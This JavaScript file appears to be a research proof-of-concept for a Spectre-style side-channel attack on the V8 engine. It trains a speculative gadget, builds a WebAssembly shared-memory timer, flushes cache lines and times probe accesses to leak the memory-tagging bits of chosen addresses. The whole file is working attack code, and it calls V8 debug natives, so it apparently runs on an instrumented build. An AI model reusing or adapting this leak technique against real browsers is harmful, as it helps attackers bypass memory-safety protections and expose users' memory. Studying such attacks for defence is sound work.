const ENTRY_SIZE = 256
const NUM=0x10
const TAG=0xf
const SLOW_IDX = ENTRY_SIZE * NUM + 0x1000
const ARRSZ = 56;
const SLOW_OFFSET = 0x000;
const SLOW_BUFFER = NUM+1;
const PROBE_BUFFER = 1;
const PROBE_OFFSET = 0;
const TRAIN_OFFSET = 64*3;
const CACHE_LINE_SZ = 64;
const CACHE_SET_SIZE = 256;
const CACHE_SET_MASK = CACHE_SET_SIZE - 1;

const BM = 128*1024*1024; // Eviction buffer
const WP = 64*1024; // A WebAssembly page has a constant size of 64KB
const SZ = BM/WP; // 128 hardcoded value in wasm

const BRANCH_TRAIN_ITER=4;
const ITER = 2048;
const NUM_TESTS = 1;

function preventOptimization(fn) {
    /**
     * Otherwise, abuse the fact that V8 refuses to optimize very large functions by rewriting the function to include a
     *  very large number of operations. We prevent these operations from actually being executed by wrapping the code
     *  in a conditional statement that is always true.
     */
    const code = fn.toString();

    // Use a parameter as the source for the conditional statement so V8 doesn't know it can remove dead code.
    let parameters = code.slice(
        code.indexOf('(') + 1,
        code.indexOf(')')
    );
    parameters = parameters.trim();
    parameters = parameters + (parameters === "" ? "" : ", ") + "__RUN__CODE__=true";

    const body = code.slice(
        code.indexOf('{') + 1,
        code.lastIndexOf('}')
    );

    const optimizationKiller = new Array(30 * 1000).fill('x++;').join("");
    const async = code.startsWith("async") ? "async" : "";

    return eval(`(
        ${async} function(${parameters}){
            if (__RUN__CODE__) {
                ${body};
                return undefined;
            }

            let x=0;
            ${optimizationKiller}
            return x;
        }
    );`);
}

function triggerGC() {
    for (let i = 0; i < 100; i++) {
      new ArrayBuffer(1024*1024);
    }
}

async function loadModule(path) {
    const response = await fetch(path);
    const buffer = await response.arrayBuffer();
    const module = new WebAssembly.Module(buffer);
    return module;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function median(arr) {
    arr.sort((a,b) => a-b);
    return (arr.length % 2) ? arr[(arr.length / 2) | 0] : mean([arr[arr.length/2 - 1], arr[arr.length / 2]]);
}


async function cache_test() {
    const index = 0;
    ITERATION = 0x1000

    var hit_time, miss_time;
    var w_hit, w_miss;
    hit_time = 0;
    miss_time = 0;
    w_hit = 0;
    w_miss = 0;

    function measure(idx) {
        const start = Atomics.load(SharedCounter, 64);
        tmp = probeArray[idx];
        const end   = Atomics.load(SharedCounter, 64);

        return end - start;
    }

    // prime
    for (let i=0; i < ITERATION; i++) {
        tmp = measure(index);
    }

    // hit
    for (let i=0; i < ITERATION; i++) {
        hit_time += measure(index);
    }

    // miss
    for (let i=0; i < ITERATION; i++) {
        %FlushAddress(probeArray, index);
        miss_time += measure(index);
    }

    // console.log("hit_time: " + hit_time/ITERATION);
    // console.log("miss_time: " + miss_time/ITERATION);

}

//////////////////////////////////////////////////////////

var tmp = 0;

function spectre_tag() {
    let i = idxArray[probe_idx];
    if (!slowArray[0]) {
        return 0;
    }

    myArray[i] = probe_offset;
    val = myArray[i];
    myArray[i] = val;
    return probeArray[myArray[i]];

}
////////////////////////////////////////////////

var res = 0;
var score = 0;

// Float64 Array
const elemsz = 8;
const isDouble = 1;


// SHARED_COUNTER_OFFSET: CACHE_LINE_SZ*4;
const SLOWARRAY_OFFSET = CACHE_LINE_SZ*12;
const PROBEARRAY_OFFSET = CACHE_LINE_SZ*14;

const wasmMemory = new WebAssembly.Memory({initial: 1, maximum: 1, shared: true});
const SharedCounter = new Uint32Array(wasmMemory.buffer, 0, 128);
for (let i = 1; i < SharedCounter.length; i++) {
    SharedCounter[i] = SharedCounter[i] + (i * 511);
}

const evictMemory = new WebAssembly.Memory({initial: SZ, maximum: SZ, shared: true});
const View = new DataView(evictMemory.buffer);
slowArray = new Uint8Array(evictMemory.buffer, SLOWARRAY_OFFSET, CACHE_LINE_SZ);

slowArray.fill(1);
slowArray.fill(0);
triggerGC();
const probeArray = new Uint8Array(evictMemory.buffer, PROBEARRAY_OFFSET, CACHE_LINE_SZ*8);

probeArray.fill(1);
probeArray.fill(0x0);
triggerGC();


const idxArray = new Float64Array(NUM*4); // should be const!!!
idxArray.fill(0);
idxArray[1] = 1;
triggerGC();

const latency = new Uint32Array(NUM);
latency.fill(0);
triggerGC();

const tmpArray = new Float64Array(10);
tmpArray.fill(0);
triggerGC();


accessArray = new Float64Array(ARRSZ);
accessArray.fill(0);
accessArray = accessArray.slice(0);
triggerGC();

myArray = new Float64Array(ARRSZ);
myArray.fill(0);
myArray = myArray.slice(0);
triggerGC();

const victim = BigInt(%GetDataPtr(myArray));
const tmpAddr = BigInt(%GetDataPtr(tmpArray));
const access = BigInt(%GetDataPtr(accessArray));
const victim_arr = %GetValue(myArray, 1234);

var correct_val, correct_tag;
var tagged_addr;
var probe_idx = 0;

slowArray[0] = 1;
probe_offset = TRAIN_OFFSET;
%PrepareFunctionForOptimization(spectre_tag);
probe_idx = 0;
spectre_tag();
probe_idx = 1;
spectre_tag();

%OptimizeFunctionOnNextCall(spectre_tag);
spectre_tag();

function alignLength() {
    let cnt = 0;
    // console.log("Aligning myArray.length");
    while (%FlushLength(myArray) != 1) {
        for (let i=0; i < 0x100; ++i);
        myArray = new Float64Array(myArray.buffer);
        triggerGC();
        if (cnt++ > 300) {
            console.log("Cannot flush myArray.length");
            return -1;
        }
    }
    return 0;
}


// Tag leakage seems to work with 2+ arguments (?) so add a dummy argument and its usage 
const tiktag = preventOptimization(function (address, dummy) {

    idxArray[0] = 0;
    for (let i=1; i <= 0xf; ++i) {
        idxArray[i] = Number(((address | (BigInt(i)<<56n)) - victim)/8n);
    }
    

    let dummy_val = Number((address| (BigInt(dummy)<<56n)) - tmpAddr);
    latency.fill(0);

    const probe_measure = preventOptimization(function probe_measure(idx) {
        const start = Atomics.load(SharedCounter, 64);
        probeArray[idx]++;
        const end   = Atomics.load(SharedCounter, 64);
        return end - start;
    });


    for (let iter = 0; iter < ITER; iter++) {
        for (let tidx = 0; tidx < 0xf; ++tidx) {
            for (let i=0; i < BRANCH_TRAIN_ITER; ++i) {
                is_warmup = ((i+1) ^ BRANCH_TRAIN_ITER) !=0;
                slowArray[0] = is_warmup;
                probe_idx = is_warmup * 0 + !is_warmup * (tidx+1);
                probe_offset = is_warmup * TRAIN_OFFSET + !is_warmup * PROBE_OFFSET;

                %FlushAddress(probeArray, 0);
                %FlushAddress(slowArray, 0);
                %FlushLength(myArray);

                spectre_tag();
            }
            lat = probe_measure(PROBE_OFFSET);
            latency[tidx] += lat;
        }
    }


    var min = 10000;
    var second_min = 10000;
    guess = 0;
    for (let i=0; i < 0xf; ++i) {
        if (min > latency[i]/ITER) {
            min = latency[i]/ITER;
            guess = i+1;
        }
    }
    for (let i=0; i < 0xf; ++i) {
        if ((i+1) == guess) {
            continue;
        }
        if (second_min > latency[i]/ITER) {
            second_min = latency[i]/ITER;
        }
    }
    var gap = (min/second_min).toFixed(2);
    if (gap <= 0.95) {
        // for (let i=0; i < 0xf; ++i) {
        //     console.log(i+1, latency[i]/ITER);
        // }
        console.log("guess: " + guess.toString(16) + " " + gap + " leaked");
        return guess;
    } else {
        // for (let i=0; i < 0xf; ++i) {
        //     console.log(i+1, latency[i]/ITER);
        // }
        console.log("guess: " + guess.toString(16) + " " + gap + " retry");
        return -1;
    }
});

async function sendResult(success, elapsed_time) {
    const result = {success: success, answer: 1, time: elapsed_time};
    const response = await fetch('/result', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({result}),
    });
    const body = await response.text();
    console.log(body);
}


async function setup() {
    can_flush = await alignLength();
    if (can_flush == -1) {
        self.postMessage(({error: ERR_ALIGN}));
        return;
    }
    const clockModule = await loadModule('clock.wasm');
    clockThread = new Worker('wasmWorker.js');
    clockThread.postMessage({"module": clockModule, "memory": wasmMemory});

    const startTick = Atomics.load(SharedCounter, 64);
    let   endTick = startTick;
    let   iterations = 0;
    
    const timer = setInterval(function(){
    endTick = Atomics.load(SharedCounter, 64);
    iterations++;
    if (startTick !== endTick) {
        clearInterval(timer);
        cache_test();
    }
    if (iterations >= 100) {
        console.log('[!] Clock failed to start...');
        clearInterval(timer);
    }
    }, 10);
    
    // here we wait for the clock to start
    while (startTick === endTick) {
        await delay(10);
    }
}
